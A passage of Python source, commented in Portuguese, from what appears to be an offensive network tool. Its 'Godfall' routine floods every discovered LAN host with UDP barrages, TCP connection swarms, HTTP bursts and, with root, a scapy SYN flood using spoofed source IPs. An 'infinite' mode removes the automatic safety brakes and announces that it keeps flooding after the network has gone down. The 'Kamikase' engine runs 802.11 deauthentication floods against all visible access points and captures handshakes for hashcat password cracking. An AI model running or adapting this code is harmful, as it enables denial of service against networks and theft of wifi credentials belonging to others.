        except asyncio.TimeoutError:
            self.ui.error("  iperf3 timeout")
        except FileNotFoundError:
            self.ui.error("  iperf3 não disponível no servidor remoto")

    async def run_godfall(self, hosts: List[Dict[str, Any]]):
        rotulo = "GODFALL ETERNAL — TITAN APEX (modo INFINITO)" if self.infinito \
                 else "GODFALL - TITAN RESILIENCE SWEEP"
        self.ui.section(rotulo)
        # Sem prompt interativo — uso é responsabilidade do operador.
        # Consulte o README seção "⚠ AVISO LEGAL --godfall" antes de usar.
        if self.infinito:
            self.ui.error("⚠ MODO INFINITO ATIVO — sem freios automáticos.")
            self.ui.error("⚠ Pressione Ctrl+C para encerrar quando desejar.")
        else:
            self.ui.warn("Teste intenso, porém controlado. Freios automáticos "
                         "(latência/loss/sucesso) ATIVOS — abortam se a rede ceder.")

        if not hosts:
            self.ui.warn("Nenhum host para testar no Godfall.")
            return

        monitor = None
        if self.det.gateway:
            monitor = LatencyMonitor(self.det.gateway, self.ui)
            monitor.start()
            self.ui.info("Monitor de latência em background iniciado.")

        # Baseline iperf3 (RECON) — absorvido do antigo --overflow
        baseline_iperf: Dict[str, Any] = {}
        if shutil.which("iperf3") and self.det.gateway:
            self.ui.info("RECON: baseline iperf3 (TCP+UDP) — pode levar até 30s...")
            try:
                await self._run_iperf(self.det.gateway, False)
                baseline_iperf["tcp"] = self.results.get("iperf_tcp", {})
                await self._run_iperf(self.det.gateway, True)
                baseline_iperf["udp"] = self.results.get("iperf_udp", {})
            except Exception:
                self.ui.warn("Baseline iperf3 falhou — seguindo sem ele.")

        base_attempts = GODFALL_ATTEMPTS_INSANE if self.insane else GODFALL_ATTEMPTS
        # Fases apex sob --root: tiers e concorrência elevados
        if priv_ativo():
            phases = list(GODFALL_PHASES_ROOT_INSANE if self.insane else GODFALL_PHASES_ROOT)
            base_attempts = int(base_attempts * 1.6)  # mais tentativas/host com root
            self.ui.warn(f"  [ROOT] Fases APEX carregadas — multipliers até "
                         f"{phases[-1]['multiplier']}x, conc. até {phases[-1]['concurrency']}.")
        else:
            phases = list(GODFALL_PHASES_INSANE if self.insane else GODFALL_PHASES)
        # Filtra o próprio IP local — não faz sentido atacar a si mesmo
        # (gasta CPU/banda e piora a lentidão de quem está rodando o godfall)
        meu_ip = getattr(self.det, "local_ip", "")
        hosts_filtrados = [h for h in hosts if h.get("ip") != meu_ip]
        if meu_ip and len(hosts_filtrados) < len(hosts):
            self.ui.info(f"Excluindo seu próprio IP ({meu_ip}) da lista de alvos.")
        prioritized_hosts = sorted(hosts_filtrados,
                                    key=lambda h: (not h.get("is_gateway", False), h["ip"]))
        per_host: Dict[str, Dict[str, Any]] = {}
        phase_results: List[Dict[str, Any]] = []
        aborted = False
        abort_reason = ""

        async def tcp_burst(ip: str, port: int, timeout_s: float) -> bool:
            try:
                _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout_s)
                w.close()
                await w.wait_closed()
                return True
            except Exception:
                return False

        async def http_burst(session: Optional["aiohttp.ClientSession"], ip: str, port: int, method: str) -> bool:
            if not HAS_AIOHTTP:
                return await tcp_burst(ip, port, 1.2)
            scheme = "https" if port in (443, 8443) else "http"
            url = f"{scheme}://{ip}:{port}/"
            try:
                if session is None:
                    timeout = aiohttp.ClientTimeout(total=2)
                    connector = aiohttp.TCPConnector(limit=1, ssl=False, force_close=True)
                    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as temp:
                        async with temp.request(method, url, ssl=False) as resp:
                            await resp.read()
                            return resp.status < 500
                async with session.request(method, url, ssl=False) as resp:
                    await resp.read()
                    return resp.status < 500
            except Exception:
                return False

        async def run_attempt(session: Optional["aiohttp.ClientSession"], ip: str, ports: List[int]) -> Tuple[bool, str]:
            web_ports = [p for p in ports if p in (80, 443, 8080, 8443, 8000, 8081, 8888)]
            infra_ports = [p for p in ports if p in (22, 53, 445, 554)]
            if web_ports:
                chosen = random.choice(web_ports)
                mode = random.choice(["HEAD", "GET", "TCP"])
                if mode == "HEAD":
                    return await http_burst(session, ip, chosen, "HEAD"), "http-head"
                if mode == "GET":
                    return await http_burst(session, ip, chosen, "GET"), "http-get"
                return await tcp_burst(ip, chosen, 1.2), "tcp-connect"
            if infra_ports:
                chosen = random.choice(infra_ports)
                return await tcp_burst(ip, chosen, 1.2), "tcp-connect"
            chosen = random.choice(ports or [80])
            return await tcp_burst(ip, chosen, 1.2), "tcp-connect"

        def _lat_window_stats(sample_window: int = 20) -> Tuple[float, float]:
            if not monitor or not getattr(monitor, "samples", None):
                return 0.0, 0.0
            window = monitor.samples[-sample_window:]
            total = len(window)
            if total == 0:
                return 0.0, 0.0
            lost = sum(1 for _, lat in window if lat < 0)
            valid = [lat for _, lat in window if lat >= 0]
            avg = (sum(valid) / len(valid)) if valid else 0.0
            loss = (lost / total) * 100.0
            return avg, loss

        def _detectar_degradacao(phase_success_pct: float) -> Tuple[bool, str]:
            """Detecta se algum dos limites de degradação foi cruzado.
            Retorna (degradado, motivo). Independente do modo infinito."""
            if not monitor:
                return False, ""
            if monitor.baseline <= 0:
                return False, ""
            avg_lat, loss_pct = _lat_window_stats()
            if loss_pct >= GODFALL_ABORT_LOSS_PCT:
                return True, f"packet_loss {loss_pct:.1f}% >= {GODFALL_ABORT_LOSS_PCT}%"
            if avg_lat and avg_lat >= (monitor.baseline * GODFALL_ABORT_LATENCY_MULT):
                return True, f"latency {avg_lat:.1f}ms >= {GODFALL_ABORT_LATENCY_MULT}x baseline"
            if phase_success_pct <= GODFALL_ABORT_SUCCESS_PCT:
                return True, f"success {phase_success_pct:.1f}% <= {GODFALL_ABORT_SUCCESS_PCT}%"
            return False, ""

        def _should_abort(phase_success_pct: float) -> Tuple[bool, str]:
            """Aplica freios. No modo --infinite, NUNCA aborta — apenas
            anuncia 'rede caiu' e segue mandando pacotes até Ctrl+C."""
            degradado, motivo = _detectar_degradacao(phase_success_pct)
            if not degradado:
                return False, ""
            if self.infinito:
                # Sem freios — só sinaliza que a rede já caiu
                self.ui.error(f"  🚨 REDE CAIU ({motivo}) — STILL FLOODING (Ctrl+C para parar)")
                return False, motivo
            return True, motivo

        barrage_pkt_counter = [0]

        def _spawn_barrage(targets: List[str], tier: int, stop_event: threading.Event) -> List[threading.Thread]:
            if tier <= 0 or not targets:
                return []
            payload_big = os.urandom(65507)
            payload_mid = os.urandom(4096)
            payload_small = os.urandom(512)
            payloads = [payload_big, payload_mid, payload_small]
            ports = GODFALL_BARRAGE_PORTS
            threads: List[threading.Thread] = []

            def udp_worker():
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    try:
                        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
                    except Exception:
                        pass
                    local = 0
                    while not stop_event.is_set():
                        try:
                            tgt = random.choice(targets)
                            pl = random.choice(payloads)
                            sock.sendto(pl, (tgt, random.choice(ports)))
                            sock.sendto(pl, (tgt, random.randint(1, 65535)))
                            local += 2
                            if local >= 512:
                                barrage_pkt_counter[0] += local
                                local = 0
                        except Exception:
                            pass
                except Exception:
                    pass

            def tcp_swarm():
                while not stop_event.is_set():
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.6)
                        try:
                            s.connect((random.choice(targets), random.choice([80, 443, 8080, 22])))
                        except Exception:
                            pass
                        finally:
                            try:
                                s.close()
                            except Exception:
                                pass
                    except Exception:
                        pass

            for _ in range(GODFALL_BARRAGE_THREADS_PER_TIER * tier):
                t = threading.Thread(target=udp_worker, daemon=True)
                t.start()
                threads.append(t)
            for _ in range(GODFALL_TCP_SWARM_PER_TIER * tier):
                t = threading.Thread(target=tcp_swarm, daemon=True)
                t.start()
                threads.append(t)
            return threads

        async def run_host_phase(host: Dict[str, Any], phase: Dict[str, Any], sem: asyncio.Semaphore,
                                 session: Optional["aiohttp.ClientSession"]) -> Dict[str, Any]:
            ip = host["ip"]
            ports = host.get("ports", [])
            target_ports = [p for p in ports if p in (80, 443, 8080, 8443, 22, 53, 445, 554, 8000, 8081, 8888)] or [80]
            attempts = max(16, int(base_attempts * phase["multiplier"]))
            op_counts = defaultdict(int)
            start = time.time()

            async def one_attempt() -> Tuple[bool, str]:
                async with sem:
                    res = await run_attempt(session, ip, target_ports)
                    if phase["delay"] > 0:
                        await asyncio.sleep(phase["delay"])
                    return res

            outcomes = await asyncio.gather(*[one_attempt() for _ in range(attempts)],
                                            return_exceptions=True)
            success = 0
            fail = 0
            for r in outcomes:
                if isinstance(r, Exception) or not isinstance(r, tuple):
                    fail += 1
                    op_counts["error"] += 1
                    continue
                ok, op_name = r
                op_counts[op_name] += 1
                if ok:
                    success += 1
                else:
                    fail += 1
            elapsed = max(time.time() - start, 0.001)
            slot = per_host.setdefault(ip, {
                "ip": ip,
                "attempts": 0,
                "success": 0,
                "fail": 0,
                "avg_rps": 0.0,
                "phase_scores": [],
                "operation_mix": defaultdict(int),
            })
            slot["attempts"] += attempts
            slot["success"] += success
            slot["fail"] += fail
            slot["avg_rps"] += attempts / elapsed
            slot["phase_scores"].append({
                "name": phase["name"],
                "success_rate": round((success / attempts) * 100, 1),
                "avg_rps": round(attempts / elapsed, 2),
            })
            for name, count in op_counts.items():
                slot["operation_mix"][name] += count
            return {"ip": ip, "attempts": attempts, "success": success, "fail": fail, "elapsed_s": elapsed}

        self.ui.info(f"Executando sweep em {len(prioritized_hosts)} hosts...")
        target_ips = [h["ip"] for h in prioritized_hosts]
        for phase in phases:
            if aborted:
                break
            phase_attempts = max(16, int(base_attempts * phase["multiplier"]))
            tier = int(phase.get("barrage", 0))
            self.ui.info(f"Fase {phase['name']}: {phase_attempts} tentativas/host | "
                         f"concorrencia {phase['concurrency']} | barrage tier {tier}")
            phase_sem = asyncio.Semaphore(phase["concurrency"])
            session = None
            if HAS_AIOHTTP:
                timeout = aiohttp.ClientTimeout(total=2)
                connector = aiohttp.TCPConnector(limit=phase["concurrency"], ssl=False, force_close=True)
                session = aiohttp.ClientSession(timeout=timeout, connector=connector)
            barrage_stop = threading.Event()
            pkt_before = barrage_pkt_counter[0]
            barrage_threads = _spawn_barrage(target_ips, tier, barrage_stop)
            if barrage_threads:
                self.ui.warn(f"  ⚡ BARRAGE armado: {len(barrage_threads)} threads (UDP+TCP)")
            # ─── Boost --root: SYN flood raw spoofed adicional ───
            raw_flood_threads: List[threading.Thread] = []
            raw_pkt_counter = [0]
            if priv_ativo() and tem_cap("scapy") and tier >= 2:
                raw_flood_threads = self._spawn_titan_flood_raw(
                    target_ips, tier, barrage_stop, raw_pkt_counter)
                if raw_flood_threads:
                    self.ui.warn(f"  ⚡ ROOT SYN FLOOD: {len(raw_flood_threads)} threads "
                                 f"raw scapy (IPs source spoofed)")
            try:
                if self.infinito and phase["name"] == "TITANFALL":
                    self.ui.warn("  ⚠ TITANFALL ETERNAL ATIVA — Ctrl+C para encerrar.")
                    host_results: List[Dict[str, Any]] = []
                    ciclo_n = 0
                    rede_ja_caiu = False
                    try:
                        while True:
                            ciclo_n += 1
                            ciclo = await asyncio.gather(
                                *[run_host_phase(h, phase, phase_sem, session)
                                  for h in prioritized_hosts])
                            host_results = ciclo
                            # Calcula sucesso do ciclo só pra alimentar o detector
                            tot_a = sum(r["attempts"] for r in host_results)
                            tot_s = sum(r["success"] for r in host_results)
                            ciclo_pct = (tot_s / tot_a * 100.0) if tot_a else 0.0
                            # Detecta degradação SEM abortar (modo infinito)
                            degr, motivo = _detectar_degradacao(ciclo_pct)
                            if degr and not rede_ja_caiu:
                                print()  # quebra a linha do contador
                                self.ui.error(f"  🚨 REDE CAIU ({motivo}) — "
                                              f"STILL FLOODING. Ctrl+C para parar.")
                                rede_ja_caiu = True
                            elif not degr and rede_ja_caiu:
                                print()
                                self.ui.success(f"  ✓ Rede recuperou — "
                                                f"flooding continua.")
                                rede_ja_caiu = False
                            tag = "💀" if rede_ja_caiu else "⚡"
                            print(f"\r  {tag} [TITANFALL ETERNAL] ciclo {ciclo_n} | "
                                  f"pacotes barrage: {barrage_pkt_counter[0]:,} | "
                                  f"sucesso ciclo: {ciclo_pct:.0f}%", end="")
                    except (KeyboardInterrupt, asyncio.CancelledError):
                        print()
                        self.ui.warn("TITANFALL ETERNAL interrompida pelo usuário.")
                else:
                    host_results = await asyncio.gather(
                        *[run_host_phase(h, phase, phase_sem, session)
                          for h in prioritized_hosts])
            finally:
                barrage_stop.set()
                if session is not None:
                    try:
                        await session.close()
                    except Exception:
                        pass
            phase_packets = barrage_pkt_counter[0] - pkt_before
            if barrage_threads:
                self.ui.success(f"  ⚡ BARRAGE finalizada: {phase_packets:,} pacotes UDP disparados")

            total_attempts = sum(r["attempts"] for r in host_results)
            total_success = sum(r["success"] for r in host_results)
            phase_success_pct = round((total_success / total_attempts) * 100, 1) if total_attempts else 0.0

            lat_snapshot = None
            if monitor and monitor.samples:
                valid = [s[1] for s in monitor.samples[-10:] if s[1] >= 0]
                if valid:
                    lat_snapshot = round(sum(valid) / len(valid), 2)
            phase_results.append({
                "name": phase["name"],
                "attempts_per_host": phase_attempts,
                "concurrency": phase["concurrency"],
                "delay_ms": int(phase["delay"] * 1000),
                "latency_snapshot_ms": lat_snapshot if lat_snapshot is not None else 0,
                "success_rate_pct": phase_success_pct,
                "barrage_tier": tier,
                "barrage_packets": phase_packets,
            })

            do_abort, why = _should_abort(phase_success_pct)
            if do_abort:
                aborted = True
                abort_reason = f"{phase['name']}: {why}"
                self.ui.warn(f"ABORT: {abort_reason}")

        per_host_rows = []
        for ip, data in per_host.items():
            attempts = max(data["attempts"], 1)
            per_host_rows.append({
                "ip": ip,
                "attempts": data["attempts"],
                "success": data["success"],
                "fail": data["fail"],
                "success_rate": round((data["success"] / attempts) * 100, 1),
                "avg_rps": round(data["avg_rps"] / max(len(phases), 1), 2),
                "phase_scores": data["phase_scores"],
                "operation_mix": dict(data["operation_mix"]),
            })

        recovery = {"recovered": False, "seconds": 0.0}
        if monitor:
            # Recovery window: wait until latency gets close to baseline for N consecutive samples.
            if monitor.baseline > 0:
                stable = 0
                start_recovery = time.time()
                while time.time() - start_recovery < GODFALL_RECOVERY_TIMEOUT_S:
                    await asyncio.sleep(0.5)
                    avg_lat, loss_pct = _lat_window_stats(sample_window=12)
                    if loss_pct <= 20.0 and avg_lat and avg_lat <= (monitor.baseline * GODFALL_RECOVERY_TARGET_MULT):
                        stable += 1
                    else:
                        stable = 0
                    if stable >= GODFALL_RECOVERY_STABLE_SAMPLES:
                        recovery["recovered"] = True
                        recovery["seconds"] = round(time.time() - start_recovery, 2)
                        break
            lat_stats = monitor.stop()
            self.results["latency"] = lat_stats
            self._print_latency_report(lat_stats)

        avg_success = round(sum(h["success_rate"] for h in per_host_rows) / len(per_host_rows), 1) if per_host_rows else 0.0
        self.results["godfall"] = {
            "hosts_tested": len(per_host_rows),
            "attempts_per_host": base_attempts,
            "avg_success_rate": avg_success,
            "phases": phase_results,
            "per_host": sorted(per_host_rows, key=lambda x: x["success_rate"]),
            "aborted": aborted,
            "abort_reason": abort_reason,
            "recovery": recovery,
            "barrage_packets_total": barrage_pkt_counter[0],
            "modo": "infinito" if self.infinito else "fases",
            "baseline_iperf": baseline_iperf,
        }

        rows = [[h["ip"], str(h["attempts"]), f"{h['success_rate']}%", f"{h['avg_rps']}"]
                for h in sorted(per_host_rows, key=lambda x: x["success_rate"])[:20]]
        self.ui.table("Godfall Titan Sweep (Top 20 piores)",
                      [("IP", C_CYAN), ("Attempts", C_WHITE), ("Success", C_YELLOW), ("Req/s", C_GREEN)],
                      rows)

    def _spawn_titan_flood_raw(self, alvos: List[str], tier: int,
                                stop_event: threading.Event,
                                contador: List[int]) -> List[threading.Thread]:
        """SYN flood raw via scapy com IPs source aleatórios. Threads
        mantêm-se rodando até stop_event.set(). Retorna lista de threads."""
        if not HAS_SCAPY or not alvos:
            return []
        threads: List[threading.Thread] = []
        n_threads = max(4, tier * 4)  # 8 a 24 threads conforme tier

        def _worker():
            local = 0
            try:
                from scapy.all import IP as _IP, TCP as _TCP, send as _send
            except Exception:
                return
            while not stop_event.is_set():
                try:
                    alvo = random.choice(alvos)
                    src = ".".join(str(random.randint(1, 254)) for _ in range(4))
                    porta = random.choice([80, 443, 22, 8080, 21, 25, 3389])
                    pkt = _IP(src=src, dst=alvo)/_TCP(
                        sport=random.randint(1024, 65535),
                        dport=porta, flags="S",
                        seq=random.randint(0, 0xFFFFFFFF))
                    _send(pkt, verbose=False)
                    local += 1
                    if local >= 64:
                        contador[0] += local
                        local = 0
                except Exception:
                    pass

        for _ in range(n_threads):
            t = threading.Thread(target=_worker, daemon=True)
            t.start()
            threads.append(t)
        return threads

    def _print_latency_report(self, stats: Dict):
        rows = [
            ["Baseline", f"{stats['baseline_ms']}ms"],
            ["Média", f"{stats['avg_ms']}ms"],
            ["Mínima", f"{stats['min_ms']}ms"],
            ["Máxima", f"{stats['max_ms']}ms"],
            ["Packet Loss", f"{stats['packet_loss_pct']}%"],
            ["Amostras", str(stats['samples'])],
        ]
        self.ui.table("Latência durante Stress",
                       [("Métrica", C_CYAN), ("Valor", C_GREEN)], rows)


# ══════════════════ KAMIKASE ENGINE ═══════════════════════════
# Deauth/Probe/Assoc flood 802.11 INFINITO em todos os APs visíveis.
# USO LEGAL APENAS — exige --root + autorização explícita digitada.

class KamikaseEngine:
    """Motor híbrido de DoS 802.11. Discovery via netsh/iw/scapy,
    monitor mode via airmon-ng/iw, ataque via aireplay-ng/mdk4 com
    fallback scapy. Contador de pacotes em tempo real, audit log."""

    def __init__(self, ui: TerminalUI, ctx: "ContextoPrivilegio",
                 detector: "NetworkDetector", live: bool = False):
        self.ui = ui
        self.ctx = ctx
        self.det = detector
        self.live = live  # modo dashboard C2 (3 zonas drag-drop)
        self.iface_orig: str = ""
        self.iface_monitor: str = ""
        self.alvos: List[Dict[str, Any]] = []
        self.contador_global = 0
        self.contador_lock = threading.Lock()
        self.contador_por_bssid: Dict[str, int] = defaultdict(int)
        self.start_time: float = 0.0
        self.stop_event = threading.Event()
        self.subprocs: List[subprocess.Popen] = []
        self.threads: List[threading.Thread] = []
        self.audit_path: Path = Path("kamikase_audit.log")
        self.encerramento_motivo: str = ""
        self.driver_info: Dict[str, Any] = {}  # Camada A+B no Windows
        # Modo --live: estado de zonas + workers
        self.zonas: Dict[str, List[str]] = {"verde": [], "vermelha": [], "azul": []}
        self.zonas_lock = threading.Lock()
        self.deauth_threads: Dict[str, threading.Thread] = {}  # bssid → thread
        self.deauth_stops: Dict[str, threading.Event] = {}     # bssid → stop
        self.capture_stops: Dict[str, threading.Event] = {}    # bssid → stop captura infinita
        self.deauth_procs: Dict[str, List[subprocess.Popen]] = {}  # bssid → [aireplay processes]
        # Semáforo limita threads de deauth simultâneas (anti-explosion)
        self.deauth_semaforo = threading.BoundedSemaphore(DEAUTH_THREAD_LIMIT)
        self.monitor_falhou = False  # flag global se setup_monitor falhou
        self.monitor_ativo = False   # lazy: só ativa quando primeiro AP entra em vermelha/azul
        self._monitor_lock = threading.Lock()
        self.carrossel: Optional["CarrosselCanal"] = None  # orquestrador único de canais
        self.hashcat_worker: Optional[HashcatWorker] = None
        self.pmkid: Optional[PMKIDCapture] = None
        self.memoria = MemoriaPersistente() if live else None
        # Scan contínuo de redes
        self.scan_continuo_ativo = False
        self.scan_continuo_thread: Optional[threading.Thread] = None
        self.scan_continuo_stop = threading.Event()
        self.scan_continuo_profundo = False

    # ─── API PÚBLICA ─────────────────────────────────────────

    async def run(self):
        if self.live:
            return await self._run_live()
        self.ui.section("KAMIKASE — DEAUTH 802.11 INFINITO")
        if not priv_ativo():
            self.ui.error("Kamikase requer --root.")
            return
        if not self._validar_pre_requisitos():
            return
        if not self._consent_duplo():
            self.ui.warn("Kamikase cancelado pelo usuário.")
            return
        if not await self._descobrir_aps():
            self.ui.error("Nenhum AP descoberto — abortando kamikase.")
            return
        if not self._setup_monitor():
            self.ui.error("Falha ao configurar modo monitor — abortando.")
            return
        self._audit_log_inicio()
        self.start_time = time.time()
        self._iniciar_ataques_paralelos()
        try:
            await self._loop_ui_live()
        except (KeyboardInterrupt, asyncio.CancelledError):
            self.encerramento_motivo = "Ctrl+C"
        finally:
            self._encerrar_limpo()

    def resultado(self) -> Dict[str, Any]:
        duracao = time.time() - self.start_time if self.start_time else 0
        return {
            "ativo": True,
            "alvos": self.alvos,
            "total_pacotes": self.contador_global,
            "pacotes_por_bssid": dict(self.contador_por_bssid),
            "duracao_s": round(duracao, 2),
            "iface": self.iface_orig,
            "monitor": self.iface_monitor,
            "motivo_encerramento": self.encerramento_motivo or "n/a",
            "audit_log": str(self.audit_path),
            "zonas": dict(self.zonas) if self.live else {},
        }

    # ─── MODO --live: dashboard com 3 zonas ──────────────────

    async def _run_live(self):
        """Modo dashboard: descobre APs, classifica em zona verde, e fica
        à disposição. Drag-drop no painel chama `mover_para_zona`."""
        self.ui.section("KAMIKASE C2 LIVE — Dashboard 3 zonas")
        if not priv_ativo():
            self.ui.error("Kamikase --live requer --root.")
            return
        if not self._validar_pre_requisitos():
            return

        # Carrega APs já vistos da memória (cross-session)
        if self.memoria:
            stats = self.memoria.stats()
            if stats["total_aps"] > 0:
                self.ui.success(f"📂 Memória carregada: {stats['total_aps']} APs salvos | "
                                f"{stats['com_handshake']} com handshake | "
                                f"{stats['quebradas']} senhas quebradas")

        # Lazy monitor: NÃO ativa airmon-ng aqui. Mantém iface managed para
        # nmcli funcionar livremente no scan inicial e contínuo. Monitor só
        # é ativado quando o primeiro AP for movido pra zona vermelha/azul.
        self.ui.info("ℹ Monitor mode preguiçoso: ativado só quando primeiro "
                     "AP for movido pra vermelha/azul.")

        # Scan inicial: 3× nmcli sequencial com dedup. Mais confiável que scapy
        # (scapy frequentemente perde canal/freq).
        self._scan_inicial_nmcli_triplo()
        if not self.alvos:
            # Fallback pro caminho normal se nmcli falhou completamente
            self.ui.warn("nmcli não retornou APs no boot — tentando descobrir via outros meios…")
            if not await self._descobrir_aps():
                self.ui.error("Nenhum AP descoberto.")
                return
        # Audita cada AP, mescla com memória e popula zona verde
        for ap in self.alvos:
            ap.update(WifiSecurityAuditor.auditar(ap))
            ap["pacotes"] = 0
            if self.memoria:
                ap_persistido = self.memoria.registrar_ap(ap)
                # Restaura senha já quebrada, handshake path, etc.
                ap.update({k: v for k, v in ap_persistido.items()
                            if k in ("senha", "quebrada_em", "wordlist_usada",
                                      "handshake_path", "handshake_em",
                                      "primeiro_visto", "visitas",
                                      "historico_zonas")})
            with self.zonas_lock:
                self.zonas["verde"].append(ap["bssid"])
            emitir("ap_descoberto", **ap)

        # NÃO ativa monitor aqui (lazy). Continuous scan rodará em managed
        # mode usando nmcli — sem channel hopper (não precisa em managed).
        try:
            self.iniciar_scan_continuo(profundo=False)
            self.ui.success("✓ Scan contínuo iniciado (nmcli, managed mode)")
        except Exception as _e:
            self.ui.warn(f"Scan contínuo não pôde iniciar: {_e}")
        self._audit_log_inicio()
        self.start_time = time.time()
        # Hashcat worker em standby (com referência à memória pra salvar senha)
        self.hashcat_worker = HashcatWorker(self.ui, memoria=self.memoria)
        self.hashcat_worker.start()
        self.pmkid = PMKIDCapture(self.ui, self.iface_monitor or self.iface_orig)
        # Loop de heartbeat: emite contador de pacotes a cada 1s e dorme
        try:
            while not self.stop_event.is_set():
                await asyncio.sleep(1.0)
                with self.contador_lock:
                    total = self.contador_global
                emitir("pacotes_total", total=total)
        except (KeyboardInterrupt, asyncio.CancelledError):
            self.encerramento_motivo = "Ctrl+C"
        finally:
            self._encerrar_limpo()

    def _scan_inicial_nmcli_triplo(self) -> None:
        """Roda nmcli 3× sequencial no boot, com pequena pausa entre, mescla
        e dedupa por BSSID. Resultado é jogado direto em self.alvos. Mais
        robusto que uma única chamada — captura redes que aparecem/somem
        entre rescans rápidos. Roda em managed mode (sem monitor)."""
        self.ui.info("🔍 Scan inicial: nmcli 3× sequencial…")
        rodadas: List[List[Dict[str, Any]]] = []
        for i in range(3):
            try:
                achados = self._scan_aps_nmcli(timeout_sec=12) or []
                self.ui.info(f"  rodada {i+1}/3: {len(achados)} APs")
                rodadas.append(achados)
            except Exception as e:
                self.ui.warn(f"  rodada {i+1}/3 falhou: {e}")
            if i < 2:
                time.sleep(1.5)
        # Mescla as 3 rodadas com dedup absoluto
        mesclados = self._mesclar_aps(*rodadas)
        self.alvos = mesclados
        self.ui.success(f"  ✓ {len(self.alvos)} APs únicos após dedup das 3 rodadas")

    def _garantir_monitor_ativo(self) -> bool:
        """Lazy-activator: liga monitor mode na primeira vez que um AP entra
        em vermelha/azul. A partir daí, nmcli para de funcionar (esperado).
        Idempotente — chamadas repetidas após primeira ativação são no-op."""
        with self._monitor_lock:
            if self.monitor_ativo:
                return True
            self.ui.info("⚙ Ativando monitor mode (primeiro AP em ataque)…")
            ok = self._setup_monitor()
            if ok:
                self.monitor_ativo = True
                self.ui.success(f"✓ Monitor mode ativo: {self.iface_monitor}")
                # Agora podemos usar channel hopper de fato
                try: emitir("monitor_pronto", iface=self.iface_monitor)
                except Exception: pass
                # Pausa scan contínuo em nmcli (não funciona em monitor)
                # mas não para a thread — ela pode tentar e ignorar quando vazio
            else:
                self.monitor_falhou = True
                self.ui.error("✗ Falha ao ativar monitor — ataques ficarão limitados")
                try: emitir("monitor_failed", iface=self.iface_orig,
                              motivo="airmon-ng falhou")
                except Exception: pass
            return ok

    def _garantir_carrossel(self) -> None:
        """Lazy-spawn do CarrosselCanal. Idempotente — chamadas repetidas
        após start são no-op. Carrossel cuida de todo o ataque/captura
        nas zonas vermelha+azul, rotacionando entre canais."""
        if self.carrossel is None:
            self.carrossel = CarrosselCanal(self)
        self.carrossel.iniciar()

    def remapear_redes(self, scan_profundo: bool = False) -> Dict[str, Any]:
        """Re-escaneia o ambiente WiFi e adiciona SÓ APs novos.
        Não duplica APs já conhecidos. Mescla com memória para
        restaurar senha/handshake de redes já vistas em outras sessões.
        Se scan_profundo=True, faz múltiplas passagens e maior timeout."""
        modo = "profundo" if scan_profundo else "rápido"
        self.ui.info(f"🔄 Remapeando redes (modo {modo})...")
        bssids_atuais = {a["bssid"] for a in self.alvos}

        # Scan exclusivamente via nmcli (decisão do usuário em v1.5.3 — scapy
        # frequentemente perde canal/freq, polui a UI). Se monitor mode estiver
        # ativo, nmcli volta vazio (esperado) — usuário deve mover APs pra fora
        # de vermelha/azul antes de re-escanear.
        achados: List[Dict[str, Any]] = []
        timeout_scan = 20 if scan_profundo else 12
        try:
            if self.ctx.motor == "adm":
                achados = self._scan_aps_windows(timeout_sec=timeout_scan)
            elif self.ctx.motor == "root-kali":
                achados = self._scan_aps_nmcli(timeout_sec=timeout_scan) or []
                if not achados and self.monitor_ativo:
                    self.ui.info("  nmcli vazio — esperado em monitor mode. "
                                 "Use o botão Scapy se quiser scan passivo.")
            elif self.ctx.motor == "root-termux":
                achados = self._scan_aps_termux(timeout_sec=timeout_scan)
        except Exception as e:
            self.ui.warn(f"  nmcli falhou: {e}")

        achados = self._mesclar_aps(achados)
        novos_aps: List[Dict[str, Any]] = []
        atualizados = 0
        for ap in achados:
            bssid = ap.get("bssid")
            if not bssid:
                continue
            if bssid in bssids_atuais:
                # Atualiza RSSI e timestamp do AP existente
                existente = next((a for a in self.alvos if a["bssid"] == bssid), None)
                if existente:
                    existente.update({k: v for k, v in ap.items()
                                      if v not in (None, "", "?")})
                    if self.memoria:
                        self.memoria.registrar_ap(existente)
                    emitir("ap_update", **existente)
                    atualizados += 1
                continue
            # AP novo: audita + mescla com memória
            ap.update(WifiSecurityAuditor.auditar(ap))
            ap["pacotes"] = 0
            if self.memoria:
                ap_persistido = self.memoria.registrar_ap(ap)
                ap.update({k: v for k, v in ap_persistido.items()
                            if k in ("senha", "quebrada_em", "wordlist_usada",
                                      "handshake_path", "handshake_em",
                                      "primeiro_visto", "visitas",
                                      "historico_zonas")})
            self.alvos.append(ap)
            with self.zonas_lock:
                self.zonas["verde"].append(bssid)
            novos_aps.append(ap)
            emitir("ap_descoberto", **ap)

        resumo = {
            "novos": len(novos_aps),
            "atualizados": atualizados,
            "total": len(self.alvos),
            "novos_essids": [a.get("essid", "?") for a in novos_aps][:10],
        }
        emitir("rescan_done", **resumo)
        self.ui.success(f"  ✓ Remap: {resumo['novos']} novas | "
                        f"{atualizados} atualizadas | total {resumo['total']}")
        return resumo

    def iniciar_scan_continuo(self, profundo: bool = False):
        """Inicia uma thread de scan contínuo de redes."""
        if self.scan_continuo_ativo:
            return
        self.scan_continuo_ativo = True
        self.scan_continuo_profundo = profundo
        self.scan_continuo_stop.clear()
        self.scan_continuo_thread = threading.Thread(
            target=self._loop_scan_continuo,
            daemon=True,
            name="scan-continuo"
        )
        self.scan_continuo_thread.start()
        # Channel hopper paralelo — varre 2.4GHz e 5GHz pra scapy/iw verem todos os canais
        try:
            self.channel_hopper_thread = threading.Thread(
                target=self._loop_channel_hopper,
                daemon=True,
                name="chan-hopper"
            )
            self.channel_hopper_thread.start()
        except Exception:
            pass
        self.ui.info(f"▶ Scan contínuo iniciado ({'profundo' if profundo else 'rápido'}) + channel hopping")
        emitir("scan_continuo_status", ativo=True, modo="profundo" if profundo else "rápido")

    def parar_scan_continuo(self):
        """Para o scan contínuo de redes."""
        if not self.scan_continuo_ativo:
            return
        self.scan_continuo_ativo = False
        self.scan_continuo_stop.set()
        if self.scan_continuo_thread and self.scan_continuo_thread.is_alive():
            self.scan_continuo_thread.join(timeout=2)
        self.ui.info("⏹ Scan contínuo parado")
        emitir("scan_continuo_status", ativo=False)

    def _loop_scan_continuo(self):
        """Loop interno de scan contínuo. Executa scans periodicamente."""
        ciclo = 0
        while not self.scan_continuo_stop.is_set():
            ciclo += 1
            try:
                # Alterna entre scan normal e profundo a cada 3 ciclos se profundo=True
